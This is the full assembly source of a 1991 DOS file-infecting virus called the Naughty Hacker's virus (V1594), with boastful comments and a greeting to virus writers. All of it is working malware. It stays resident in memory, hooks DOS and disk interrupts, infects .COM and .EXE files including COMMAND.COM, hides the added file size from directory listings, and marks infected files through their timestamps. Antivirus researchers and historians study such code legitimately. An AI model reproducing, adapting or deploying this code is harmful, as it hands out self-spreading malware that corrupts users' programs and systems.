
        .radix  16


	;*********************************
	;*   The Naughty Hacker's virus  *
	;*VERSION 3.1 (And not the last.)*
	;*          ( V1594 )            *
	;*  Finished on the 10.04.1991   *
	;*                               *
	;*    Glad to meet you friend!   *
	;*                               *
	;*********************************

;
; "It's hard to find a black cat in a dark room, especially if it's not there."
;
; П░ед ва▒ ▒▓ои о░игинални┐ ▓ек▒▓ на V1594 (ако може ▓ака да каже !@!?!).
; Ав▓о░║▓ (Кон┐) п░едва░и▓елно п░ед│п░еждава,╖е не желае ▓ози ▓ек▒▓ да б║де
; п░омен┐н по никак║в на╖ин, но ако желае▓е да го │▒║в║░╕ен▒▓ва▓е може да
; нап░ави▓е ▓ова нап║лно ▒вободно п░и един▒▓вено▓о │▒ловие, ╖е в пол│╖ена▓а
; нова ве░▒и┐ н┐ма да има никакви ░аз░│╕и▓елни ┤│нк╢ии.
; Ав▓о░║▓ не поема никаква о▓гово░но▒▓ за ╣е▓и п░и╖инени о▓ ВИРУСА ......
;
; Да ▒е компили░а на TURBO ASSEMBLER Ver 1.03B. Така пол│╖ени┐ код е го▓ов
; за ▒▓а░▓и░ане и ....
;
;                  Позд░ави до в▒и╖ки VIRUSWRITERS !
;
;
;                         To be continued ...
;


	call	Start_Virus
	mov	dx,offset Hellomsg
	mov	ah,9
	int	21
	int	20

Hellomsg db	0a,0dh,7,'HI WORLD,GIVE ME COMMAND.COM !!!',0a,0dh,7,'$'

	Virus_lenght	equ	endcode-adjust
	alllen		equ	buffer-adjust

	adjust	label word


	IP_save label	word

	First_3 Label Byte
						;For .COM file here stores
	ret
	nop
	nop

	CS_save dw	?			;The first 3 bytes
	SP_save dw	?
	SS_save dw	0FFFF			;0FFFF For COM files


signature:

	db	'N.Hacker'			;It's me the HORSE !!!

date_stamp:

	dd	10041991			;10.04.1991

Run_The_Program:

	pop	ds				;Restore saved ds,es,ax
	pop	es				;ds=es=PSP
	pop	ax
	cmp	cs:[bp+SS_save-adjust],0FFFF	;Run the infected program
	je	Run_COM_File

	mov	ax,ds				;Calculate load segment
	add	ax,10
	mov	bx,ax
	add	ax,cs:[bp+CS_save-adjust]	;Calculate CS value
	add	bx,cs:[bp+SS_save-adjust]	;Calculate SS value
	mov	ss,bx				;Run .EXE program
	mov	sp,word ptr cs:[bp+SP_save-adjust]
	push	ax
	push	word ptr cs:[bp+IP_save-adjust]
	retf

Run_COM_File:

	mov	di,100
	mov	si,bp
	movsb					;Restore the first 3 bytes
	movsw					;Run .COM program
	mov	bx,100
	push	bx
	sub	bh,bh
	ret

;*******************************************************************
;                                                                  *
;                  This is the program entry....                   *
;                                                                  *
;*******************************************************************


Start_Virus:

	call	Get_IP				;This is to get the IP value.

Get_IP:
	pop	bp				;Get it in BP.
	sub	bp,Get_IP-adjust		;adjust BP point to the begining
	cld					;Clear direction flag
	push	ax				;Save some registres
	push	es
	push	ds
	mov	es,[2]				;get last segment
	mov	di,Run_The_Program-adjust	;(last segment=segment of virus)

	push	ds
	push	cs
	pop	ds
	mov	si,di
	add	si,bp
	mov	cx,endcode-Run_The_Program
	rep	cmpsb				;check if virus is in memory
	pop	ds
	push	ds
	pop	es
	je	Run_The_Program ;If so then run the program

	mov	word ptr cs:[bp+handle-adjust],0ffff ;set handle_save
	mov	ax,ds
	dec	ax
	mov	ds,ax				;ds=MCB
	sub	word ptr [3],80	;Set block size
	sub	word ptr [12],80		;Set last segment
	mov	es,[12] ;steal some memory (2K)
	push	cs
	pop	ds
	sub	di,di
	mov	si,bp				;prepare to move in high mem
	mov	cx,alllen			;will move virus+variables
	rep	movsb				;copy there
	push	cs
	mov	ax,Run_The_Program-adjust
	add	ax,bp
	push	ax
	push	es
	mov	ax,offset Set_Vectors-adjust	;Set vectors
	push	ax
	retf

Find_First_Next:

	call	Call_Original_INT_21h		;fuck when do the dir command
	push	bx
	push	es
	push	ax
	or	al,al
	jnz	Go_Out_		 ;if error

	mov	ah,2f				;get DTA address
	int	21

	mov	al,byte ptr es:[bx+30d] ;Seconds in al
	and	al,31d			;Mask seconds
	cmp	al,60d/2			;Seconds=60?
	jne	Go_Out_

	mov	ax,es:[bx+36d]
	mov	dx,es:[bx+38d]		;Check File size
	cmp	ax,Virus_lenght*2
	sbb	dx,0
	jb	Go_Out_


Adjust_Size:

	sub	es:[bx+28d+7+1],Virus_lenght ;Adjust size
	sbb	es:[bx+28d+2+7+1],0

Go_Out_:

	pop	ax
	pop	es			;Return to caller
	pop	bx
	iret

Find_First_Next1:

	call	Call_Original_INT_21h
	pushf
	push	ax
	push	bx				;fuck again
	push	es
	jc	Go_Out_1

	mov	ah,2f
	int	21

	mov	al,es:[bx+22d]
	and	al,31d
	cmp	al,60d/2
	jne	Go_Out_1

	mov	ax,es:[bx+26d]
	mov	dx,es:[bx+28d]
	cmp	ax,Virus_lenght*2
	sbb	dx,0
	jb	Go_Out_1

Adjust_Size1:

	sub	es:[bx+26d],Virus_lenght
	sbb	es:[bx+28d],0

Go_Out_1:

	pop	es
	pop	bx
	pop	ax			; Dummy proc far
	popf				; ret   2
	db	0ca,2,0 ;retf 2         ; Dummy endp =>  BUT too long...


	;*************************************
	;                                    *
	;       Int 21 entry point.          *
	;                                    *
	;*************************************



INT_21h_Entry_Point:


	cmp	ah,11
	je	Find_First_Next	;Find First Next (old)
	cmp	ah,12
	je	Find_First_Next

	cmp	ah,4e			;Find First Next (new)
	je	Find_First_Next1
	cmp	ah,4f
	je	Find_First_Next1

	cmp	ah,6ch
	jne	not_create		;Create (4.X)
	test	bl,1
	jz	not_create
	jnz	create

not_create:

	cmp	ah,3ch			;Create (3.X)
	je	create
	cmp	ah,5bh
	je	create

	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	bp
	push	ds
	push	es

	mov	byte ptr cs:[function-adjust],ah

	cmp	ah,6ch		;Open (4.X)
	je	create_

	cmp	ah,3e		;Close
	je	close_

	cmp	ax,4b00		;Exec
	je	Function_4Bh

	cmp	ah,17		;Rename (old)
	je	ren_FCB

	cmp	ah,56		;Rename (new)
	je	Function_4Bh

	cmp	ah,43		;Change attributes
	je	Function_4Bh

	cmp	ah,3dh		;Open (3.X)
	je	open

Return_Control:

	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax

Go_out:

	jmp	dword ptr cs:[current_21h-adjust]	;go to the old int 21

create_:

	or	bl,bl		;Create file?
	jnz	Return_Control
	mov	dx,si
	jmp	Function_4Bh

ren_FCB:

	cld
	inc	dx
	mov	si,dx
	mov	di,offset buffer-adjust
	push	di
	push	cs
	pop	es		;Convert FCB format Fname into ASCIIZ string
	mov	cx,8
	rep	movsb
	mov	al,'.'
	stosb
	mov	cx,3
	rep	movsb
	sub	al,al
	stosb
	pop	dx
	push	cs
	pop	ds
	jmp	Function_4Bh

create:

;       cmp     word ptr cs:[handle-adjust],0ffff
;       jne     Go_out

	call	Call_Original_INT_21h
	jc	Error
	mov	word ptr cs:[handle-adjust],ax
	jnc	Exit_
Error:
	mov	word ptr cs:[handle-adjust],0ffff	;Useless
Exit_:
;       retf    2
	db 0ca,2,0

close_:
	cmp	word ptr cs:[handle-adjust],0ffff
	je	Return_Control
	cmp	bx,word ptr cs:[handle-adjust]
	jne	Return_Control

	mov	ah,45
	call	Infect_It
	mov	word ptr cs:[handle-adjust],0ffff
	jmp	Return_Control

Function_4Bh:

	mov	ax,3d00h
open:
	call	Infect_It
	jmp	Return_Control

;******************************************
;                                         *
;       This infects the programs...      *
;                                         *
;******************************************

Infect_It:

	call	Call_Original_INT_21h		;this is the infecting part
	jnc	No_error
	ret

No_error:

	xchg	ax,bp
	mov	byte ptr cs:[flag-adjust],0
	mov	ah,54
	call	Call_Original_INT_21h
	mov	byte ptr cs:[veri-adjust],al
	cmp	al,1				;Switch off verify...
	jne	Go_On_Setting
	mov	ax,2e00
	call	Call_Original_INT_21h

Go_On_Setting:

	push	cs
	push	cs
	pop	ds
	pop	es
	mov	dx,offset DOS_13h-adjust
	mov	bx,dx			;Set New DOS int 13h
	mov	ah,13
	call	Call_Original_INT_2Fh

	mov	ax,3513
	call	Call_Original_INT_21h
	push	bx
	push	es

	mov	word ptr cs:[current_13h-adjust],bx
	mov	word ptr cs:[current_13h-adjust+2],es

	mov	ah,25
	mov	dx,INT_13h_entry-adjust ;Set int 13h
	push	cs
	pop	ds
	call	Call_Original_INT_21h

	mov	ax,3524
	call	Call_Original_INT_21h
	push	bx
	push	es

	mov	ah,25
	mov	dx,INT_24h_entry-adjust ;Set int 24h (Useless maybe...).
	call	Call_Original_INT_21h

	xchg	bx,bp
	push	bx
	mov	ax,1220
	call	Call_Original_INT_2Fh
	mov	bl,es:[di]		;Remember the good old V512 ?
	mov	ax,1216
	call	Call_Original_INT_2Fh
	pop	bx
	add	di,11

	mov	byte ptr es:[di-15d],2
	mov	ax,es:[di]
	mov	dx,es:[di+2]
	cmp	ax,Virus_lenght+1
	sbb	dx,0
	jnb	Go_on
	jmp	close
Go_on:
	cmp	byte ptr cs:[function-adjust],3dh
	je	Scan_name
	cmp	byte ptr cs:[function-adjust],6ch
	jne	Dont_Scan_Name

Scan_name:

	push	di
	add	di,0f
	mov	si,offset fname-adjust	;wasn't that the last opened file?
	cld
	mov	cx,8+3
	rep	cmpsb
	pop	di
	jne	Dont_Scan_Name
	jmp	close

Dont_Scan_Name:

	cmp	es:[di+18],'MO'
	jne	Check_For_EXE			;check for .COM file
	cmp	byte ptr es:[di+17],'C'
	jne	Check_For_EXE
	jmp	com

Check_For_EXE:

	cmp	es:[di+18],'EX'
	jne	Not_good			;check for .EXE file
	cmp	byte ptr es:[di+17],'E'
	je	Check_For_Valid_EXE

Not_good:

	jmp	close

Check_For_Valid_EXE:

	call	Read_First_18
	cmp	word ptr [si],'ZM'
	je	Valid_EXE			;check for valid .EXE file
	cmp	word ptr [si],'MZ'
	je	Valid_EXE
	jmp	close

 Valid_EXE:

	cmp	word ptr [si+0c],0ffff	;only low-mem .EXE
	je	Low_Mem
	jmp	close

Low_Mem:

	mov	cx,[si+16]
	add	cx,[si+8]			;Something common with EDDIE..
	mov	ax,10
	mul	cx
	add	ax,[si+14]
	adc	dx,0
	mov	cx,es:[di]
	sub	cx,ax
	xchg	cx,ax
	mov	cx,es:[di+2]
	sbb	cx,dx
	or	cx,cx
	jnz	Not_Infected_EXE			;infected?
	cmp	ax,(endcode-Start_Virus)
	jne	Not_Infected_EXE
	jmp	close

Not_Infected_EXE:

	mov	ax,[si+10]
	mov	[SP_save-adjust],ax
	mov	ax,[si+0e]
	mov	[SS_save-adjust],ax
	mov	ax,[si+14]
	mov	[IP_save-adjust],ax
	mov	ax,[si+16]
	mov	[CS_save-adjust],ax			;set the new header
	mov	ax,es:[di]
	mov	dx,es:[di+2]

	add	ax,Virus_lenght
	adc	dx,0
	mov	cx,200					;(C) by Lubo & Jan...
	div	cx
	mov	[si+2],dx
	or	dx,dx
	jz	OK_MOD
	inc	ax

OK_MOD:
	mov	[si+4],ax
	mov	ax,es:[di]
	mov	dx,es:[di+2]

	mov	cx,4
	push	ax

Compute:

	shr	dx,1
	rcr	ax,1
	loop	Compute
	pop	dx
	and	dx,0f

	sub	ax,[si+8]
	add	dx,Start_Virus-adjust
	adc	ax,0
	mov	[si+14],dx
	mov	[si+16],ax
	add	ax,(Virus_lenght)/16d+1
	mov	[si+0eh],ax
	mov	[si+10],100
 write:
	mov	ax,5700
	call	Call_Original_INT_21h
	push	cx
	push	dx

	sub	cx,cx
	mov	es:[di+4],cx
	mov	es:[di+6],cx
	mov	cl,20
	xchg	cl,byte ptr es:[di-0dh]
	push	cx
	mov	ah,40	;this writes the first few bytes and glues the virus
	mov	dx,buffer-adjust
	mov	cx,18

	call	Call_Original_INT_21h
	mov	ax,es:[di]
	mov	es:[di+4],ax
	mov	ax,es:[di+2]
	mov	es:[di+6],ax
	call	Check_For_COMMAND	;(C)
	jne	Dont_Adjust_Size
	sub	es:[di+4],Virus_lenght
	sbb	es:[di+6],0		;???????????????????????????????

Dont_Adjust_Size:

	mov	ah,40
	sub	dx,dx
	mov	cx,Virus_lenght
	call	Call_Original_INT_21h

	pop	cx
	mov	byte ptr es:[di-0dh],cl
	pop	dx
	pop	cx

	cmp	byte ptr cs:[flag-adjust],0ff
	je	Set_Time_and_Date
exit:
	call	Check_For_COMMAND
	je	Set_Time_and_Date
	and	cl,11100000b
	or	cl,60d/2

Set_Time_and_Date:

	mov	ax,5701
	call	Call_Original_INT_21h
close:

	mov	ah,3e
	call	Call_Original_INT_21h
	push	es
	pop	ds
	mov	si,di
	add	si,0f
	mov	di,fname-adjust
	push	cs
	pop	es
	mov	cx,8+3		;save the fname to a quit place
	cld
	rep	movsb
	push	cs
	pop	ds

	cmp	byte ptr cs:[flag-adjust],0ff
	jne	Dont_Clear_Buffers
	mov	ah,0dh			;if error occured->clear disk buffers

	call	Call_Original_INT_21h

Dont_Clear_Buffers:

	les	bx,[org_13h-adjust]
	lds	dx,[org_13h-adjust]
	mov	ah,13
	call	Call_Original_INT_2Fh

	cmp	byte ptr cs:[veri-adjust],1
	jne	Restore_Vectors
	mov	ax,2e01

	call	Call_Original_INT_21h

Restore_Vectors:

	sub	ax,ax
	mov	ds,ax
	pop	[24*4+2]
	pop	[24*4]
	pop	[13*4+2]
	pop	[13*4]		;restore vectors and return
	ret
 com:
	test	byte ptr es:[di-0dh],4	;if it is a system file
	jnz	Not_OK_COM_File	;I had some problems here with
                                        ;V1160 & V1776 (with the ball)
	cmp	es:[di],65535d-Virus_lenght*2-100
	ja	Not_OK_COM_File

	call	Read_First_18
	cmp	byte ptr [si],0E9
	jne	OK_COM_file
	mov	ax,es:[di]
        sub     ax,[si+1]               ;infected?
	cmp	ax,(endcode-Start_Virus+3)
	je	Not_OK_COM_File

OK_COM_file:

	mov	word ptr [SS_save-adjust],0FFFF
	push	si
	lodsb
	mov	word ptr [First_3-adjust],ax
	lodsw
	mov	word ptr [First_3-adjust+1],ax
	pop	si
	mov	ax,es:[di]
	add	ax,Start_Virus-adjust-3
	call	Check_For_COMMAND
	jne	Normally
	sub	ax,Virus_lenght

Normally:

	mov	byte ptr [si],0E9
	mov	word ptr [si+1],ax
	jmp	write

Not_OK_COM_File:

	jmp	close

Set_Vectors:

	sub	ax,ax
	mov	ds,ax

	push	[1*4]
	push	[1*4+2]			; <= (C) by N.Hacker.

	pushf
	pushf
	pushf
	pushf

	mov	byte ptr cs:[flag-adjust],ah
	mov	byte ptr cs:[my_flag-adjust],ah
	mov	word ptr cs:[limit-adjust],300
	mov	word ptr cs:[mem_-adjust],org_21h-adjust

	mov	[1*4],offset trap-adjust
	mov	[1*4+2],cs

	call	set_trace

	mov	ax,3521

	call	dword ptr [21h*4]


	mov	byte ptr cs:[flag-adjust],0
	mov	word ptr cs:[mem_-adjust],org_2fh-adjust

	call	set_trace

	mov	ax,1200

	call	dword ptr [2fh*4]		;do trace int 2f


	mov	byte ptr cs:[flag-adjust],0
	mov	byte ptr cs:[my_flag-adjust],0FF
	mov	word ptr cs:[limit-adjust],0C800
	mov	word ptr cs:[mem_-adjust],org_13h-adjust

	call	set_trace

	sub	ax,ax
	mov	dl,al

	call	dword ptr [13h*4]	;do trace int 13

	mov	byte ptr cs:[flag-adjust],0
	mov	word ptr cs:[limit-adjust],0F000
	mov	word ptr cs:[mem_-adjust],Floppy_org_13h-adjust

	call	set_trace

	sub	ax,ax
	mov	dl,al

	call	dword ptr [13h*4]

	pop	[1*4+2]
	pop	[1*4]

	les	ax,[21*4]
	mov	word ptr cs:[current_21h-adjust],ax	;get old int 21
	mov	word ptr cs:[current_21h-adjust+2],es
	mov	[21*4], INT_21h_Entry_Point-adjust		;set it
	mov	[21*4+2],cs
	retf

set_trace:

	pushf
	pop	ax
	or	ax,100
	push	ax
	popf
	ret

trap:
	push	bp
	mov	bp,sp
	push	bx
	push	di
	cmp	byte ptr cs:[flag-adjust],0ff
	je	off
	mov	di,word ptr cs:[mem_-adjust]
	mov	bx,word ptr cs:[limit-adjust]
	cmp	[bp+4],bx
	pushf
	cmp	word ptr cs:[my_flag-adjust],0ff
	jne	It_Is_JA

	popf
	jb	Go_out_of_trap
	jmp	It_Is_JB

It_Is_JA:

	popf
	ja	Go_out_of_trap

It_Is_JB:

	mov	bx,[bp+2]
	mov	word ptr cs:[di],bx
	mov	bx,[bp+4]
	mov	word ptr cs:[di+2],bx
	mov	byte ptr cs:[flag-adjust],0ff
off:
	and	[bp+6],0feff

Go_out_of_trap:

	pop	di
	pop	bx
	pop	bp
	iret

Call_Original_INT_21h:

	pushf
	call	dword ptr cs:[org_21h-adjust]
	ret

Call_Original_INT_2Fh:

	pushf
	call	dword ptr cs:[org_2fh-adjust]
	ret

INT_24h_entry:

	mov	al,3
	iret

;**************************
;    (C) by N.Hacker.     *
;      (bellow)           *
;**************************

INT_13h_entry:

	mov	byte ptr cs:[next_flag-adjust],0

	cmp	ah,2
	jne	Other

	cmp	byte ptr cs:[function-adjust],03Eh
	jne	Dont_hide

	dec	byte ptr cs:[next_flag-adjust]
	inc	ah
	jmp	Dont_hide

Other:

	cmp	ah,3
	jne	Dont_hide

	cmp	byte ptr cs:[flag-adjust],0ff
	je	no_error_

	cmp	byte ptr cs:[function-adjust],03Eh
	je	Dont_hide

	inc	byte ptr cs:[next_flag-adjust]
	dec	ah

Dont_hide:

	pushf
	call	dword ptr cs:[current_13h-adjust]
	jnc	no_error_
	mov	byte ptr cs:[flag-adjust],0ff

no_error_:

	clc
	db	0ca,02,0		;retf 2


DOS_13h:

	cmp	byte ptr cs:[next_flag-adjust],0
	je	OK

	cmp	ah,2
	je	Next
	cmp	ah,3
	jne	OK
Next:
	cmp	byte ptr cs:[next_flag-adjust],1
	jne	Read
	inc	ah
	jne	OK
Read:

	dec	ah
OK:
	test	dl,80
	jz	Floppy
	jmp	dword ptr cs:[org_13h-adjust]
Floppy:
	jmp	dword ptr cs:[Floppy_org_13h-adjust]


Read_First_18:

	sub	ax,ax
	mov	es:[di+4],ax
	mov	es:[di+6],ax
	mov	ah,3f
	mov	cx,18
	mov	dx,buffer-adjust
	mov	si,dx
	call	Call_Original_INT_21h
        ret

Check_For_COMMAND:

	cmp	es:[di+0f],'OC'
	jne	Not_COMMAND
	cmp	es:[di+11],'MM'
	jne	Not_COMMAND
	cmp	es:[di+13],'NA'
	jne	Not_COMMAND			;check for command.com
	cmp	es:[di+15],' D'
	jne	Not_COMMAND
	cmp	es:[di+17],'OC'
	jne	Not_COMMAND
	cmp	byte ptr es:[di+19],'M'

Not_COMMAND:

	ret

endcode label	word

	current_21h	dd ?
	null		dd ?	;I forgot to remove this variable...
	current_13h	dd ?
	org_2fh dd	?
	org_13h dd	?
	org_21h dd	?
	Floppy_org_13h	dd ?
	flag	db	?	;0ff if error occures
	veri	db	?
	handle	dw	?
	fname	db	8+3 dup (?)
	function db	?
	my_flag db ?
	limit		dw ?
	mem_		dw ?
	next_flag	db ?

buffer	label	word
